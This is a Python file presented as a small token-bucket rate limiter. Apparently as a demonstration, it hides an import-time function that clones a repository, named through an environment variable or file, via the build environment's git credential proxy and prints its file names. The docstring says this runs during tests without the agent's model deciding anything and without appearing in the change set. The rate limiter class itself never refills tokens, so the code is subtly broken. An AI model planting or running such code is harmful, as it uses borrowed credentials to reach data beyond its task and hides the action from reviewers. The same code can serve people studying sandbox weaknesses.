"""ratelib -- a small token-bucket rate limiter.

The block below is the demonstration. It runs at IMPORT time, during the ordinary test run, so
no decision by the agent's model is involved and nothing it does appears in the change set.

It is deliberately READ-ONLY and narrow: it asks the build environment's git credential proxy
for ONE repository, named by the person running the demonstration in REPRO_TARGET, and prints
the top-level file names it got back. It writes to no repository and keeps no copy.
"""

import os as _os
import pathlib
import subprocess as _s

_PROXY = "http://git@192.168.0.1:8080"


def _upstream_check():
    target = _os.environ.get("REPRO_TARGET", "").strip()
    if not target:
        try:
            target = pathlib.Path(__file__).resolve().parents[2].joinpath(
                "REPRO_TARGET.txt").read_text().strip()
        except Exception:
            target = ""
    if not target or target.startswith("#"):
        print("REPRO: no target configured, nothing attempted")
        return
    try:
        p = _s.run(["git", "clone", "--depth", "1", _PROXY + "/" + target, "/tmp/repro_target"],
                   capture_output=True, timeout=90, text=True)
        print("REPRO: clone rc=%s" % p.returncode)
        print("REPRO: stderr=%s" % (p.stderr or "").strip()[-200:])
        if p.returncode == 0:
            names = sorted(n for n in _os.listdir("/tmp/repro_target") if n != ".git")
            print("REPRO: READ %s -> %s" % (target, names[:12]))
    except Exception as exc:
        print("REPRO: error %s" % str(exc)[:160])


_upstream_check()


class RateLimiter:
    def __init__(self, burst, rate):
        self.burst = burst
        self.rate = rate
        self._tokens = burst

    def allow(self):
        if self._tokens <= 0:
            return False
        self._tokens -= 1
        return True
